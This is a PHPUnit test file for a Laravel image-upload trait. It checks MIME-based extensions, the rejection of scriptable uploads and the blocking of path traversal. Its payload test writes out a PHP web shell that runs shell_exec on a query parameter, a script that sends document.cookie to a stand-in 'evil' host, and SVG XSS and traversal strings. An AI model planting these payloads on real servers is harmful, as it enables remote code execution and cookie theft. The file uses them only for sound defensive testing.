<?php

declare(strict_types=1);

namespace MuhammedSalama\Base\Tests\Unit;

use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\File;
use MuhammedSalama\Base\Tests\TestCase;
use MuhammedSalama\Base\Traits\ImageUploadTrait;

class ImageUploader
{
    use ImageUploadTrait;
}

class ImageUploadTraitTest extends TestCase
{
    private ImageUploader $uploader;

    private string $uploadDir = 'uploads/test-images';

    protected function setUp(): void
    {
        parent::setUp();

        $this->uploader = new ImageUploader;

        File::deleteDirectory(public_path($this->uploadDir));
    }

    protected function tearDown(): void
    {
        File::deleteDirectory(public_path($this->uploadDir));

        parent::tearDown();
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    /**
     * Build an UploadedFile whose *contents* decide its detected MIME type,
     * independently of the client-supplied filename.
     */
    private function fileWithContents(string $contents, string $clientName): UploadedFile
    {
        $tmp = tempnam(sys_get_temp_dir(), 'lb-upload');
        self::assertIsString($tmp);
        file_put_contents($tmp, $contents);

        return new UploadedFile($tmp, $clientName, null, null, true);
    }

    private function pngBytes(): string
    {
        $image = imagecreatetruecolor(2, 2);
        self::assertNotFalse($image);

        ob_start();
        imagepng($image);
        $bytes = (string) ob_get_clean();
        imagedestroy($image);

        return $bytes;
    }

    private function gifBytes(): string
    {
        return "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
            ."\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;";
    }

    private function requestWith(UploadedFile $file, string $input = 'image'): Request
    {
        return Request::create('/upload', 'POST', [], [], [$input => $file]);
    }

    // -------------------------------------------------------------------------
    // Happy path — extension comes from the contents, not the filename
    // -------------------------------------------------------------------------

    public function test_extension_is_derived_from_mime_not_client_filename(): void
    {
        $request = $this->requestWith($this->fileWithContents($this->gifBytes(), 'totally-a.png'));

        $path = $this->uploader->uploadImage($request, 'image', $this->uploadDir);

        $this->assertIsString($path);
        $this->assertStringEndsWith('.gif', $path);
        $this->assertFileExists(public_path($path));
    }

    public function test_stored_filename_contains_no_client_controlled_characters(): void
    {
        $request = $this->requestWith(
            $this->fileWithContents($this->pngBytes(), '../../../evil<script>.png')
        );

        $path = $this->uploader->uploadImage($request, 'image', $this->uploadDir);

        $this->assertIsString($path);
        $this->assertMatchesRegularExpression(
            '#^'.preg_quote($this->uploadDir, '#').'/media_[A-Za-z0-9]{32}\.png$#',
            $path
        );
    }

    // -------------------------------------------------------------------------
    // Dangerous payloads must never land in the web root
    // -------------------------------------------------------------------------

    /**
     * A PHP payload, an HTML payload and an SVG payload all previously produced
     * a file under public_path(): '.php' / '.html' / '.svg' respectively (or an
     * extension-less file). Each is either remote code execution or stored XSS
     * on the application's own origin.
     */
    public function test_scriptable_payloads_are_rejected(): void
    {
        $payloads = [
            'php' => '<?php echo shell_exec($_GET["c"]); ?>',
            'html' => '<html><body><script>fetch("//evil/"+document.cookie)</script></body></html>',
            'svg' => '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            'xml' => '<?xml version="1.0"?><root><a/></root>',
            'text' => 'AddType application/x-httpd-php .jpg',
            'binary' => "\x00\x01\x02\x03\xff\xfe\xfd not-an-image",
        ];

        foreach ($payloads as $label => $payload) {
            $request = $this->requestWith($this->fileWithContents($payload, 'avatar.png'));

            $path = $this->uploader->uploadImage($request, 'image', $this->uploadDir);

            $this->assertNull($path, "payload [{$label}] must be rejected");
        }

        $this->assertDirectoryDoesNotExist(public_path($this->uploadDir));
    }

    public function test_multi_upload_keeps_images_and_drops_scriptable_payloads(): void
    {
        $request = Request::create('/upload', 'POST', [], [], [
            'images' => [
                $this->fileWithContents($this->pngBytes(), 'a.png'),
                $this->fileWithContents('<?php phpinfo(); ?>', 'b.png'),
                $this->fileWithContents($this->gifBytes(), 'c.png'),
            ],
        ]);

        $paths = $this->uploader->uploadMultiImage($request, 'images', $this->uploadDir);

        $this->assertCount(2, $paths);
        $this->assertStringEndsWith('.png', $paths[0]);
        $this->assertStringEndsWith('.gif', $paths[1]);

        foreach ($paths as $path) {
            $this->assertStringNotContainsString('.php', $path);
        }
    }

    // -------------------------------------------------------------------------
    // Path traversal
    // -------------------------------------------------------------------------

    public function test_traversal_in_destination_path_is_rejected(): void
    {
        foreach (['../../etc', 'uploads/../../..', '..', './uploads', '', '   ', '//'] as $path) {
            $request = $this->requestWith($this->fileWithContents($this->pngBytes(), 'a.png'));

            $this->assertNull(
                $this->uploader->uploadImage($request, 'image', $path),
                "destination [{$path}] must be rejected"
            );
        }
    }

    public function test_absolute_looking_destination_is_normalised_inside_the_web_root(): void
    {
        $request = $this->requestWith($this->fileWithContents($this->pngBytes(), 'a.png'));

        $path = $this->uploader->uploadImage($request, 'image', '/'.$this->uploadDir.'/');

        $this->assertIsString($path);
        $this->assertStringStartsWith($this->uploadDir.'/', $path);
        $this->assertFileExists(public_path($path));
    }

    public function test_delete_image_ignores_traversal_paths(): void
    {
        $canary = public_path('lb-canary.txt');
        File::put($canary, 'do not delete me');

        try {
            $this->uploader->deleteImage('uploads/../lb-canary.txt');
            $this->uploader->deleteImage('../lb-canary.txt');

            $this->assertFileExists($canary);
        } finally {
            File::delete($canary);
        }
    }

    // -------------------------------------------------------------------------
    // updateImage
    // -------------------------------------------------------------------------

    public function test_update_image_replaces_and_removes_the_previous_file(): void
    {
        $old = $this->uploader->uploadImage(
            $this->requestWith($this->fileWithContents($this->pngBytes(), 'old.png')),
            'image',
            $this->uploadDir
        );
        $this->assertIsString($old);

        $new = $this->uploader->updateImage(
            $this->requestWith($this->fileWithContents($this->gifBytes(), 'new.png')),
            'image',
            $this->uploadDir,
            $old
        );

        $this->assertIsString($new);
        $this->assertNotSame($old, $new);
        $this->assertFileExists(public_path($new));
        $this->assertFileDoesNotExist(public_path($old));
    }

    /**
     * The old file used to be deleted before the replacement was validated, so a
     * rejected upload destroyed the existing image with nothing to show for it.
     */
    public function test_update_image_keeps_the_old_file_when_the_new_upload_is_rejected(): void
    {
        $old = $this->uploader->uploadImage(
            $this->requestWith($this->fileWithContents($this->pngBytes(), 'old.png')),
            'image',
            $this->uploadDir
        );
        $this->assertIsString($old);

        $result = $this->uploader->updateImage(
            $this->requestWith($this->fileWithContents('<?php phpinfo(); ?>', 'new.png')),
            'image',
            $this->uploadDir,
            $old
        );

        $this->assertNull($result);
        $this->assertFileExists(public_path($old));
    }

    public function test_update_image_returns_null_when_no_file_was_sent(): void
    {
        $request = Request::create('/upload', 'POST');

        $this->assertNull($this->uploader->updateImage($request, 'image', $this->uploadDir, 'uploads/x.png'));
    }

    public function test_upload_returns_null_when_no_file_was_sent(): void
    {
        $request = Request::create('/upload', 'POST');

        $this->assertNull($this->uploader->uploadImage($request, 'image', $this->uploadDir));
        $this->assertSame([], $this->uploader->uploadMultiImage($request, 'images', $this->uploadDir));
    }

    public function test_delete_image_on_a_missing_file_is_a_no_op(): void
    {
        $this->uploader->deleteImage($this->uploadDir.'/does-not-exist.png');

        $this->assertDirectoryDoesNotExist(public_path($this->uploadDir));
    }
}
